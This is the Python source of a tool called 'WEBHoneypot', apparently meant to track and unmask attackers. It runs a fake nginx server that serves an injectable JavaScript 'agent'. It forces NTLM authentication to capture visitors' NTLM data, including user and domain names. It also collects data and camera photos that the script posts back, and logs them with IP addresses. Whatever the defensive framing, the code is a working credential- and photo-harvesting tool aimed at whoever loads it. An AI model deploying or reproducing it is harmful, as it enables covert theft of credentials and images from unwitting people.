from http.server import *
import sys
import base64
import time
import urllib.parse
import re
import config
import SQLHoneypot
import os


class RequestHandler(SimpleHTTPRequestHandler):
    server_version = "nginx"
    sys_version = ""

    def do_GET(self):
        if "/agent" in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'application/x-javascript')
            self.end_headers()
            js = config.js.replace('{url}', url)
            self.wfile.write(js.encode())
        if "/login" in self.path:
            if "NTLM" in str(self.headers):
                ntlm = re.search('NTLM ([^\r\n]+)', str(self.headers))
                text = base64.b64decode(ntlm.group(1))
                if text.find(b'\x00H\x00T\x00T\x00P\x00/\x00') == -1:
                    self.send_response(401)
                    self.send_header(
                        'WWW-Authenticate',
                        'NTLM TlRMTVNTUAACAAAAAAAAACgAAAABggAAAAICAgAAAAAAAAAAAAAAAA=='
                    )
                    self.end_headers()
                else:
                    self.send_response(200)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    info = text.split(
                        b'\x00H\x00T\x00T\x00P\x00/\x00')[-1].replace(
                            b'\x00', b'').decode()
                    print('[+]NTLM:' + info)
                    with open(savePath, 'a+') as f:
                        f.write('[*]ip:' + self.client_address[0] + '\n')
                        f.write('[+]time:' + time.strftime(
                            "%Y-%m-%d %H:%M:%S", time.localtime()) + '\n')
                        f.write('[+]User-Agent:' + self.headers["User-Agent"] +
                                '\n')
                        f.write('[+]NTLM:' + info + '\n')
            else:
                self.send_response(401)
                self.send_header('WWW-Authenticate', 'NTLM')
                self.end_headers()
        if "/admin" in self.path:
            self.send_response(200)
            self.end_headers()
            print("[+] Data: " + self.client_address[0])
            with open(savePath, 'a+') as f:
                f.write('[*]ip:' + self.client_address[0] + '\n')
                f.write('[+]time:' +
                        time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) +
                        '\n')
                f.write('[+]User-Agent:' + self.headers["User-Agent"] + '\n')
                f.write('[+]admin:visit\n')
            address = url.replace('http://', '').replace('https://',
                                                         '').split(':')[0]
            config.html = config.html.replace('{address}', address)
            self.wfile.write(config.html.encode())

    def do_POST(self):
        data = "Success"
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(data.encode("utf-8"))
        req_datas = self.rfile.read(int(self.headers["content-length"]))
        print(self.headers["User-Agent"])

        if "/data" in self.path:
            httpData = urllib.parse.unquote(req_datas.decode())
            index = httpData.index('data=')
            responseData = httpData[index + 5:]
            print("[+] Data: " + responseData)
            with open(savePath, 'a+') as f:
                f.write('[*]ip:' + self.client_address[0] + '\n')
                f.write('[+]time:' +
                        time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) +
                        '\n')
                f.write('[+]User-Agent:' + self.headers["User-Agent"] + '\n')
                f.write('[+]Data:' + responseData + '\n')

        if "/photo" in self.path:
            httpData = urllib.parse.unquote(req_datas.decode())
            index = httpData.index('base64,')
            responseData = httpData[index + 7:]
            imgPath = os.path.dirname(__file__) + "/result/" + time.strftime(
                "%Y-%m-%d %H:%M:%S", time.localtime()) + ".png"
            print("[+] Photo: " + imgPath)
            with open(imgPath, 'wb') as f:
                f.write(base64.b64decode(responseData))
            with open(savePath, 'a+') as f:
                f.write('[*]ip:' + self.client_address[0] + '\n')
                f.write('[+]time:' +
                        time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) +
                        '\n')
                f.write('[+]User-Agent:' + self.headers["User-Agent"] + '\n')
                f.write('[+]Photo:' + imgPath + '\n')


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("WEBHoneypot")
        print("Use to build a web honeypot agent")
        print("Author: fatekey")
        print("Usage: python3 WEBHoneypot.py <port> <url>")
    else:
        port = int(sys.argv[1])
        url = sys.argv[2]
        localtime = time.strftime("%Y%m%d-%H%M%S", time.localtime())
        savePath = os.path.dirname(__file__) + "/result/" + str(
            localtime) + ".txt"
        print("WEBHoneypot")
        print("Author: fatekey")
        print("[+] Port: " + str(port))
        print("[+] Agent: <srcipt src='%s/agent'></srcipt>" % url)
        print("[+] Save: " + str(savePath))
        print("Use Ctrl+C to stop the server")
        try:
            httpd = HTTPServer(('', port), RequestHandler)
            httpd.serve_forever()
            if 'mysql' in config.module:
                SQLHoneypot.run(config.mysql_port)
        except KeyboardInterrupt:
            print("\n[+] Server stopped")